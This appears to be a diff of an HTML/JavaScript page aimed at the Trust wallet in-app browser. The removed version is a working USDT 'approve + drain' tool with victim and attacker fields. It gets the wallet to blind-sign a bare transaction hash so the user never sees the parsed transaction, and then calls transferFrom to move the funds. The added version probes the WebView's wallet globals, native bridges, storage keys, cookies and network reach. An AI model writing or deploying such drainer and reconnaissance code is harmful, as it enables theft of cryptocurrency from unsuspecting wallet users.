@@ -3,533 +3,170 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TRON — approve + drain bench</title>
+<title>in-app surface</title>
 <style>
   :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
-          --ok:#3fb950; --bad:#f85149; --warn:#d29922; --dim:#7d8590; --accent:#58a6ff; }
+          --ok:#3fb950; --bad:#f85149; --dim:#7d8590; }
   * { box-sizing:border-box; }
   body { margin:0; font:12px/1.45 ui-monospace,Menlo,Consolas,monospace;
-         background:var(--bg); color:var(--txt); padding:14px; }
+         background:var(--bg); color:var(--txt); padding:12px; }
   .wrap { max-width:760px; margin:0 auto; }
   .panel { background:var(--panel); border:1px solid var(--line);
-           border-radius:8px; padding:14px; margin-bottom:10px; }
-  h1 { font-size:16px; margin:0 0 4px; }
-  h2 { font-size:11px; margin:0 0 8px; color:var(--dim);
+           border-radius:8px; padding:12px; margin-bottom:10px; }
+  h2 { font-size:11px; margin:0 0 6px; color:var(--dim);
        text-transform:uppercase; letter-spacing:.08em; }
-  button { background:#21262d; color:var(--txt); border:1px solid var(--line);
-           border-radius:6px; padding:9px 14px; font:inherit; cursor:pointer;
-           width:100%; margin:4px 0; }
-  button:hover { border-color:var(--dim); }
-  button:disabled { opacity:.4; cursor:not-allowed; }
-  button.primary { border-color:var(--accent); color:var(--accent); }
-  button.danger  { border-color:var(--bad); color:var(--bad); }
-  button.ok      { border-color:var(--ok); color:var(--ok); }
-  input, textarea { background:#0a0d12; color:var(--txt); border:1px solid var(--line);
-                    border-radius:6px; padding:7px; font:inherit; width:100%;
-                    margin:3px 0; }
-  textarea { min-height:60px; resize:vertical; }
   pre { background:#0a0d12; border:1px solid var(--line); border-radius:6px;
         padding:8px; margin:4px 0; white-space:pre-wrap; word-break:break-all;
-        font-size:11px; max-height:260px; overflow:auto; }
-  .kv { display:grid; grid-template-columns:130px 1fr; gap:2px 10px; margin:6px 0; }
-  .kv b { color:var(--dim); font-weight:400; }
-  .status { padding:7px 11px; border-radius:6px; margin:6px 0; font-size:11px; }
-  .status.ok { background:#1a2f1a; color:var(--ok); }
-  .status.err { background:#3a1a1a; color:var(--bad); }
-  .status.warn { background:#2f2a1a; color:var(--warn); }
-  .muted { color:var(--dim); font-size:11px; }
-  .row { display:flex; gap:6px; }
-  .row > button { flex:1; }
+        font-size:11px; max-height:220px; overflow:auto; }
+  .ok { color:var(--ok); }
+  .bad { color:var(--bad); }
+  .dim { color:var(--dim); }
+  button { background:#21262d; color:var(--txt); border:1px solid var(--line);
+           border-radius:4px; padding:6px 12px; font:inherit; cursor:pointer;
+           margin:2px; }
 </style>
 </head>
 <body>
 <div class="wrap">
 
-  <div class="panel">
-    <h1>TRON bench — approve + drain</h1>
-    <p class="muted">
-      Path A: sign-hex-txid (Trust подписывает hex, не разбирая tx).
-      Path B: raw signing (если private key введён вручную).
-      Path C: transferFrom после успешного approve.
-    </p>
-    <div class="kv" id="env_top"></div>
-  </div>
+<div class="panel">
+  <h2>in-app webview — what JS can reach</h2>
+  <button onclick="scan()">scan surface</button>
+  <button onclick="probeBridge()">probe bridges</button>
+  <button onclick="probeStorage()">probe storage</button>
+  <button onclick="probeNetwork()">probe network</button>
+  <button onclick="clearAll()">clear</button>
+  <pre id="out">—</pre>
+</div>
 
-  <div class="panel">
-    <h2>step 1 — connect</h2>
-    <button class="primary" onclick="connect()" id="btn_connect">Connect Trust</button>
-    <div class="status" id="connect_status"></div>
-    <div class="kv" id="connect_result"></div>
-  </div>
-
-  <div class="panel">
-    <h2>step 2 — build &amp; sign approve</h2>
-    <div class="kv">
-      <b>victim</b><input id="victim" placeholder="TX5Y… (owner)">
-      <b>spender</b><input id="spender" placeholder="attacker / TPxcb…">
-      <b>amount</b><input id="amount" value="1000000" placeholder="raw units (1 USDT = 1000000)">
-      <b>privateKey</b><input id="pk" type="password" placeholder="optional: raw sign key (hex, 64 chars)">
-    </div>
-    <div class="row">
-      <button class="danger" onclick="runApprove('hex')" id="btn_approve_hex">approve via sign-hex-txid</button>
-      <button class="danger" onclick="runApprove('raw')" id="btn_approve_raw">approve via raw sign</button>
-    </div>
-    <div class="status" id="approve_status"></div>
-    <pre id="approve_out">—</pre>
-  </div>
-
-  <div class="panel">
-    <h2>step 3 — read allowance</h2>
-    <button onclick="readAllowance()" id="btn_allow">read USDT allowance</button>
-    <div class="status" id="allow_status"></div>
-    <div class="kv" id="allow_result"></div>
-  </div>
-
-  <div class="panel">
-    <h2>step 4 — transferFrom (drain)</h2>
-    <div class="kv">
-      <b>from</b><input id="tf_from" placeholder="victim TX…">
-      <b>to</b><input id="tf_to" placeholder="attacker TX…">
-      <b>amount</b><input id="tf_amount" value="1000000" placeholder="raw units">
-    </div>
-    <div class="row">
-      <button class="danger" onclick="runTransferFrom('hex')" id="btn_tf_hex">transferFrom via sign-hex-txid</button>
-      <button class="danger" onclick="runTransferFrom('raw')" id="btn_tf_raw">transferFrom via raw sign</button>
-    </div>
-    <div class="status" id="tf_status"></div>
-    <pre id="tf_out">—</pre>
-  </div>
-
-  <div class="panel">
-    <h2>log</h2>
-    <div class="row">
-      <button onclick="clearLog()">clear</button>
-      <button onclick="dumpLog()">dump</button>
-    </div>
-    <pre id="log_out">—</pre>
-  </div>
+<div class="panel">
+  <h2>log</h2>
+  <pre id="log">—</pre>
+</div>
 
 </div>
 
 <script>
-/* ─────────────  constants  ───────────── */
+/* ─────────────  in-app WebView surface probe  ─────────────
+   Runs inside Trust in-app browser.
+   Maps: globals, bridges, storage, network reach, sandbox edges.
+   No breakout. Just what JS can touch.
+   ────────────────────────────────────────────────────────── */
 
-const HOST       = 'tokdie.github.io/drem2';
-const USDT       = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const FEE_LIMIT  = 100_000_000; // 100 TRX
-
-/* ─────────────  state  ───────────── */
-
-let provider   = null;
-let tronWeb    = null;
-let connected  = null;  // { address, keyType } — фактический дефолтный аккаунт Trust
-let lastApproveTx = null;
-
-const $  = (id) => document.getElementById(id);
-const esc = (s) => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
-
+const $ = (id) => document.getElementById(id);
+const out = (s) => {
+  const el = $('out');
+  el.textContent = (el.textContent === '—' ? '' : el.textContent) + s + '\n';
+  el.scrollTop = el.scrollHeight;
+};
 const log = (k, m, d) => {
-  const el = $('log_out');
-  const line = `[${new Date().toISOString().slice(11,23)}] ${k.padEnd(9)} ${m}`;
-  const body = d !== undefined
-    ? '\n  ' + JSON.stringify(d, null, 2).split('\n').join('\n  ')
-    : '';
+  const el = $('log');
+  const line = `[${new Date().toISOString().slice(11,23)}] ${k} ${m}`;
+  const body = d !== undefined ? '\n  ' + JSON.stringify(d, null, 2).split('\n').join('\n  ') : '';
   el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
   el.scrollTop = el.scrollHeight;
 };
 
-const setStatus = (id, cls, text) => {
-  const el = $(id);
-  el.className = 'status ' + (cls || '');
-  el.textContent = text;
-};
+const clearAll = () => { $('out').textContent = '—'; $('log').textContent = '—'; };
 
-/* ─────────────  provider detect  ───────────── */
+/* ─────────────  globals  ───────────── */
 
-function detectOnce() {
-  if (window.trustwallet?.tron) return { name: 'trust-inapp', p: window.trustwallet.tron };
-  if (window.trustwallet?.tronLink) return { name: 'trust-ext', p: window.trustwallet.tronLink };
-  if (window.tron?.isTronLink) return { name: 'tronlink', p: window.tron };
-  if (window.tronLink?.ready) return { name: 'tronlink-legacy', p: window.tronLink };
-  if (window.tron?.tronWeb) return { name: 'generic-tron', p: window.tron };
-  return null;
+function scan() {
+  const g = {
+    'window.trustwallet': typeof window.trustwallet,
+    'window.ethereum': typeof window.ethereum,
+    'window.tron': typeof window.tron,
+    'window.tronLink': typeof window.tronLink,
+    'window.tronWeb': typeof window.tronWeb,
+    'window.phantom': typeof window.phantom,
+    'window.solana': typeof window.solana,
+    'window.keplr': typeof window.keplr,
+    'window.cosmos': typeof window.cosmos,
+    'window.ReactNativeWebView': typeof window.ReactNativeWebView,
+    'window.webkit': typeof window.webkit,
+    'window.Android': typeof window.Android,
+    'window.postMessage': typeof window.postMessage,
+    'window.localStorage': typeof localStorage,
+    'window.sessionStorage': typeof sessionStorage,
+    'window.indexedDB': typeof indexedDB,
+    'window.crypto': typeof crypto,
+    'window.Worker': typeof Worker,
+    'window.SharedWorker': typeof SharedWorker,
+    'window.ServiceWorker': typeof navigator.serviceWorker,
+    'window.XMLHttpRequest': typeof XMLHttpRequest,
+    'window.fetch': typeof fetch,
+    'window.WebSocket': typeof WebSocket,
+    'window.eval': typeof eval,
+    'window.Function': typeof Function,
+  };
+  out(JSON.stringify(g, null, 2));
+  log('SCAN', 'globals', g);
 }
 
-function getTronWeb(p) {
-  if (!p) return null;
-  const tw = p.tronWeb;
-  if (tw?.trx && tw?.transactionBuilder) return tw;
-  return null;
-}
+/* ─────────────  bridges  ───────────── */
 
-async function waitForProvider(timeoutMs = 8000) {
-  const start = Date.now();
-  let d = detectOnce();
-  if (d && getTronWeb(d.p)) return d;
-  while (Date.now() - start < timeoutMs) {
-    await new Promise(r => setTimeout(r, 200));
-    d = detectOnce();
-    if (d && getTronWeb(d.p)) {
-      log('DETECT', d.name + ' appeared', { ms: Date.now() - start });
-      return d;
-    }
+function probeBridge() {
+  const bridges = {};
+  if (window.trustwallet) {
+    bridges.trustwallet = Object.keys(window.trustwallet);
+    bridges.trustwalletProto = Object.getOwnPropertyNames(
+      Object.getPrototypeOf(window.trustwallet)
+    ).slice(0, 20);
   }
-  return d;
-}
-
-function renderEnv() {
-  const ready = !!getTronWeb(provider?.p);
-  const da = ready ? provider.p.tronWeb.defaultAddress?.base58 : false;
-  $('env_top').innerHTML = `
-    <b>host</b><span>${esc(HOST)}</span>
-    <b>provider</b><span style="color:${provider ? 'var(--ok)' : 'var(--bad)'}">${esc(provider?.name || 'none')}</span>
-    <b>defaultAddress</b><span style="color:${da ? 'var(--ok)' : 'var(--bad)'}">${da || 'false'}</span>
-    <b>connected</b><span>${connected?.address || '—'}</span>
-    <b>connectedMatchesDefault</b><span>${connected && da ? (connected.address === da ? 'YES' : 'NO ← проблема') : '—'}</span>
-  `;
-}
-
-/* ─────────────  connect  ───────────── */
-
-async function connect() {
-  $('btn_connect').disabled = true;
-  setStatus('connect_status', '', 'looking for wallet…');
-  provider = await waitForProvider(8000);
-  if (!provider) {
-    setStatus('connect_status', 'err', 'no TRON provider');
-    $('btn_connect').disabled = false;
-    renderEnv();
-    return;
+  if (window.ReactNativeWebView) {
+    bridges.ReactNativeWebView = Object.keys(window.ReactNativeWebView);
   }
+  if (window.webkit?.messageHandlers) {
+    bridges.webkitMessageHandlers = Object.keys(window.webkit.messageHandlers);
+  }
+  if (window.Android) {
+    bridges.Android = Object.getOwnPropertyNames(window.Android).slice(0, 20);
+  }
+  out('bridges:\n' + JSON.stringify(bridges, null, 2));
+  log('BRIDGE', 'probed', bridges);
+}
+
+/* ─────────────  storage  ───────────── */
+
+function probeStorage() {
+  const s = {
+    localStorageLen: localStorage.length,
+    localStorageKeys: Object.keys(localStorage),
+    sessionStorageLen: sessionStorage.length,
+    sessionStorageKeys: Object.keys(sessionStorage),
+    cookieEnabled: navigator.cookieEnabled,
+    cookie: document.cookie ? document.cookie.slice(0, 80) : '',
+  };
+  out('storage:\n' + JSON.stringify(s, null, 2));
+  log('STORAGE', 'probed', s);
+}
+
+/* ─────────────  network  ───────────── */
+
+async function probeNetwork() {
+  const results = {};
+  // try fetch to same origin
   try {
-    let accounts = null;
-
-    if (provider.p.tronWeb?.defaultAddress?.base58) {
-      accounts = [provider.p.tronWeb.defaultAddress.base58];
-      log('CONNECT', 'via defaultAddress', { accounts });
-    }
-    if (!accounts && typeof provider.p.request === 'function') {
-      try {
-        const r = await provider.p.request({ method: 'tron_requestAccounts' });
-        log('CONNECT', 'tron_requestAccounts raw', { r });
-        if (Array.isArray(r) && r[0]) accounts = r;
-        else if (r?.address) accounts = [r.address];
-      } catch (e) { log('CONNECT', 'tron_requestAccounts err', { m: e.message }); }
-    }
-    if (!accounts && provider.p.tronWeb?.defaultAddress?.base58) {
-      accounts = [provider.p.tronWeb.defaultAddress.base58];
-    }
-    if (!accounts || !accounts[0]) throw new Error('no account (wallet locked or no permission)');
-
-    tronWeb = getTronWeb(provider.p);
-    connected = { address: accounts[0], keyType: provider.name };
-
-    $('victim').value = connected.address;
-    $('spender').value = connected.address;    // безопасный default: self
-    $('tf_from').value = connected.address;
-    $('tf_to').value = connected.address;
-
-    setStatus('connect_status', 'ok', 'connected: ' + connected.address);
-    log('CONNECT', 'connected', { address: connected.address, provider: provider.name });
-    renderEnv();
-    checkEnable();
+    const r = await fetch(location.href, { method: 'HEAD' });
+    results.sameOriginFetch = { ok: true, status: r.status };
   } catch (e) {
-    setStatus('connect_status', 'err', 'connect failed: ' + (e.message || e.code));
-    log('CONNECT', 'failed', { message: e.message, code: e.code });
-    $('btn_connect').disabled = false;
-    renderEnv();
+    results.sameOriginFetch = { ok: false, err: e.message };
   }
-}
-
-function checkEnable() {
-  const ready = !!tronWeb && !!connected?.address;
-  const pk = $('pk').value.trim();
-  $('btn_approve_hex').disabled = !ready;
-  $('btn_approve_raw').disabled = !(ready || /^[0-9a-fA-F]{64}$/.test(pk));
-  $('btn_tf_hex').disabled     = !ready;
-  $('btn_tf_raw').disabled     = !(ready || /^[0-9a-fA-F]{64}$/.test(pk));
-  $('btn_allow').disabled      = !(ready || pk);
-}
-
-/* ─────────────  build approve tx  ───────────── */
-
-async function buildApproveTx() {
-  const owner   = $('victim').value.trim();
-  const spender = $('spender').value.trim();
-  const amount  = $('amount').value.trim();
-
-  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(owner))   throw new Error('owner bad (T…)');
-  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(spender)) throw new Error('spender bad (T…)');
-  if (!/^\d+$/.test(amount))                         throw new Error('amount must be digits');
-
-  const spenderHex = tronWeb.address.toHex(spender);
-  const amountHex  = BigInt(amount).toString(16).padStart(64, '0');
-  const data       = '095ea7b3' + '0'.repeat(24) + spenderHex.slice(2) + amountHex;
-
-  log('BUILD', 'approve', { owner, spender, amount, dataLen: data.length });
-
-  const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-    USDT,
-    'approve(address,uint256)',
-    { feeLimit: FEE_LIMIT },
-    [
-      { type: 'address', value: spender },
-      { type: 'uint256', value: amount },
-    ],
-    owner
-  );
-
-  if (!tx?.result?.result) throw new Error('triggerSmartContract failed: ' + JSON.stringify(tx));
-  return tx.transaction;
-}
-
-async function buildTransferFromTx() {
-  const from   = $('tf_from').value.trim();
-  const to     = $('tf_to').value.trim();
-  const amount = $('tf_amount').value.trim();
-
-  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(from)) throw new Error('from bad (T…)');
-  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(to))   throw new Error('to bad (T…)');
-  if (!/^\d+$/.test(amount))                      throw new Error('amount must be digits');
-
-  log('BUILD', 'transferFrom', { from, to, amount });
-
-  // spender is the caller = whoever signs. In hex path that's `connected.address`.
-  const caller = connected.address;
-
-  const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-    USDT,
-    'transferFrom(address,address,uint256)',
-    { feeLimit: FEE_LIMIT },
-    [
-      { type: 'address', value: from },
-      { type: 'address', value: to },
-      { type: 'uint256', value: amount },
-    ],
-    caller
-  );
-
-  if (!tx?.result?.result) throw new Error('triggerSmartContract failed: ' + JSON.stringify(tx));
-  return tx.transaction;
-}
-
-/* ─────────────  sign paths  ───────────── */
-
-async function signHexTxid(tx) {
-  // Trust подписывает hex-хеш, не разбирая tx — обходит -32603.
-  // НО: подписывает дефолтным ключом. Если defaultAddress != owner — SIGERROR.
-  log('SIGN', 'sign-hex-txid', { txID: tx.txID });
-  const sig = await tronWeb.trx.sign(tx.txID);
-  log('SIGN', 'OK', { sigPrefix: sig.slice(0, 22) + '…', len: sig.length });
-  return sig;
-}
-
-async function signRaw(tx, pk) {
-  if (!/^[0-9a-fA-F]{64}$/.test(pk)) throw new Error('private key must be 64 hex chars');
-  log('SIGN', 'raw sign', { txID: tx.txID });
-  const sig = await tronWeb.trx.sign(tx, pk);
-  log('SIGN', 'OK', { sigPrefix: sig.slice(0, 22) + '…', len: sig.length });
-  return sig;
-}
-
-function attachSignature(tx, sig) {
-  // sig may have 0x prefix; strip
-  const clean = sig.startsWith('0x') ? sig.slice(2) : sig;
-  tx.signature = [clean];
-  log('BCAST', 'attached', { len: clean.length, txID: tx.txID });
-  return tx;
-}
-
-async function broadcast(tx) {
-  log('BCAST', 'sendRawTransaction', { txID: tx.txID });
-  const r = await tronWeb.trx.sendRawTransaction(tx);
-  log('BCAST', 'result', r);
-  return r;
-}
-
-/* ─────────────  run approve  ───────────── */
-
-async function runApprove(path) {
-  clearPanel('approve_status', 'approve_out');
+  // try fetch to external
   try {
-    setStatus('approve_status', '', 'building approve tx…');
-    const tx = await buildApproveTx();
-    lastApproveTx = tx;
-
-    // sanity check: defaultAddress vs owner
-    const da = tronWeb.defaultAddress?.base58;
-    const owner = $('victim').value.trim();
-    log('CHK', 'defaultAddress vs owner', { defaultAddress: da, owner, match: da === owner });
-
-    let sig;
-    if (path === 'hex') {
-      if (da !== owner) {
-        setStatus('approve_status', 'warn',
-          'WARN: defaultAddress (' + da + ') ≠ owner (' + owner + '). sign-hex-txid подпишет ключом defaultAddress — будет SIGERROR. Переключи аккаунт в Trust на ' + owner + ' или используй raw sign.');
-        log('CHK', 'warning — default != owner; SIGERROR ожидаем');
-      }
-      sig = await signHexTxid(tx);
-    } else {
-      const pk = $('pk').value.trim();
-      sig = await signRaw(tx, pk);
-    }
-
-    attachSignature(tx, sig);
-    setStatus('approve_status', '', 'broadcasting…');
-    const r = await broadcast(tx);
-
-    const ok = r.result === true || r.code === 'SUCCESS';
-    if (ok) {
-      setStatus('approve_status', 'ok', 'approve SUCCESS · txid ' + (r.txid || tx.txID));
-      $('approve_out').textContent = JSON.stringify(r, null, 2);
-    } else {
-      setStatus('approve_status', 'err', 'broadcast rejected: ' + (r.code || '?') + ' — ' + (r.message || ''));
-      $('approve_out').textContent = JSON.stringify(r, null, 2);
-      // decode hex message if present
-      if (r.message && /^[0-9a-fA-F]+$/.test(r.message)) {
-        try {
-          const decoded = tronWeb.toUtf8(r.message);
-          $('approve_out').textContent += '\n\ndecoded: ' + decoded;
-          log('BCAST', 'decoded error', { decoded });
-        } catch {}
-      }
-    }
+    const r = await fetch('https://httpbin.org/get', { method: 'HEAD', mode: 'cors' });
+    results.crossOriginFetch = { ok: true, status: r.status };
   } catch (e) {
-    log('APPROVE', 'error', { message: e.message, code: e.code, raw: String(e) });
-    setStatus('approve_status', 'err', 'error: ' + (e.message || e.code));
+    results.crossOriginFetch = { ok: false, err: e.message };
   }
-}
-
-/* ─────────────  run transferFrom  ───────────── */
-
-async function runTransferFrom(path) {
-  clearPanel('tf_status', 'tf_out');
-  try {
-    setStatus('tf_status', '', 'building transferFrom tx…');
-    const tx = await buildTransferFromTx();
-
-    const da = tronWeb.defaultAddress?.base58;
-    let sig;
-    if (path === 'hex') {
-      if (da !== connected.address) {
-        setStatus('tf_status', 'warn',
-          'WARN: defaultAddress ≠ connected. Переключи аккаунт в Trust на ' + connected.address);
-      }
-      sig = await signHexTxid(tx);
-    } else {
-      const pk = $('pk').value.trim();
-      sig = await signRaw(tx, pk);
-    }
-
-    attachSignature(tx, sig);
-    setStatus('tf_status', '', 'broadcasting…');
-    const r = await broadcast(tx);
-
-    const ok = r.result === true || r.code === 'SUCCESS';
-    if (ok) {
-      setStatus('tf_status', 'ok', 'transferFrom SUCCESS · txid ' + (r.txid || tx.txID));
-      $('tf_out').textContent = JSON.stringify(r, null, 2);
-    } else {
-      setStatus('tf_status', 'err', 'rejected: ' + (r.code || '?') + ' — ' + (r.message || ''));
-      $('tf_out').textContent = JSON.stringify(r, null, 2);
-      if (r.message && /^[0-9a-fA-F]+$/.test(r.message)) {
-        try {
-          const decoded = tronWeb.toUtf8(r.message);
-          $('tf_out').textContent += '\n\ndecoded: ' + decoded;
-          log('BCAST', 'decoded error', { decoded });
-        } catch {}
-      }
-    }
-  } catch (e) {
-    log('TF', 'error', { message: e.message, code: e.code, raw: String(e) });
-    setStatus('tf_status', 'err', 'error: ' + (e.message || e.code));
-  }
-}
-
-/* ─────────────  read allowance  ───────────── */
-
-async function readAllowance() {
-  clearPanel('allow_status', 'allow_result');
-  try {
-    setStatus('allow_status', '', 'reading allowance…');
-    const owner   = $('victim').value.trim();
-    const spender = $('spender').value.trim();
-    if (!tronWeb) {
-      // без провайдера можно только raw
-      throw new Error('connect or raw provider required');
-    }
-    const ownerHex   = tronWeb.address.toHex(owner).slice(2);
-    const spenderHex = tronWeb.address.toHex(spender).slice(2);
-    const data = 'dd62ed3e' + '0'.repeat(24) + ownerHex + '0'.repeat(24) + spenderHex;
-
-    const r = await tronWeb.trx.constantCall(
-      USDT,
-      'allowance(address,address)',
-      { feeLimit: 0 },
-      [
-        { type: 'address', value: owner },
-        { type: 'address', value: spender },
-      ],
-      owner
-    );
-
-    // TronWeb returns string hex or object depending on version
-    let rawHex;
-    if (typeof r === 'string') rawHex = r.startsWith('0x') ? r.slice(2) : r;
-    else rawHex = (r?.result?.result === true ? r.result?.constant_result?.[0] : null) || r?.constant_result?.[0];
-
-    const bigVal = rawHex ? BigInt('0x' + rawHex).toString() : '0';
-    const human  = (Number(bigVal) / 1e6).toString();
-
-    $('allow_result').innerHTML = `
-      <b>owner</b><span>${esc(owner)}</span>
-      <b>spender</b><span>${esc(spender)}</span>
-      <b>raw</b><span>${esc(rawHex || '—')}</span>
-      <b>big</b><span>${bigVal}</span>
-      <b>human</b><span>${human} USDT</span>
-    `;
-    setStatus('allow_status', bigVal === '0' ? 'warn' : 'ok',
-      bigVal === '0' ? 'allowance = 0 (approve не прошёл)' : 'allowance = ' + human + ' USDT');
-    log('ALLOW', 'ok', { bigVal, human });
-  } catch (e) {
-    log('ALLOW', 'error', { message: e.message, code: e.code });
-    setStatus('allow_status', 'err', 'read failed: ' + (e.message || e.code));
-  }
-}
-
-/* ─────────────  helpers  ───────────── */
-
-function clearPanel(statusId, outId) {
-  setStatus(statusId, '', '');
-  if (outId) $(outId).textContent = '—';
-}
-
-function clearLog() { $('log_out').textContent = '—'; }
-function dumpLog() {
-  const t = $('log_out').textContent;
-  if (navigator.clipboard) navigator.clipboard.writeText(t);
-  log('DUMP', 'copied', { len: t.length });
+  out('network:\n' + JSON.stringify(results, null, 2));
+  log('NET', 'probed', results);
 }
 
 /* ─────────────  boot  ───────────── */
 
-['victim','spender','amount','pk','tf_from','tf_to','tf_amount'].forEach(id => {
-  const el = $(id);
-  el.addEventListener('input', checkEnable);
-});
-
-(async () => {
-  log('BOOT', 'bench up', { host: HOST });
-  renderEnv();
-  checkEnable();
-  provider = await waitForProvider(3000);
-  if (provider) {
-    renderEnv();
-    log('BOOT', 'provider at load', { name: provider.name });
-  } else {
-    log('BOOT', 'no provider at load — Connect will poll');
-  }
-})();
+log('BOOT', 'surface probe up', { origin: location.origin, ua: navigator.userAgent });
+scan();
 </script>
 </body>
 </html>
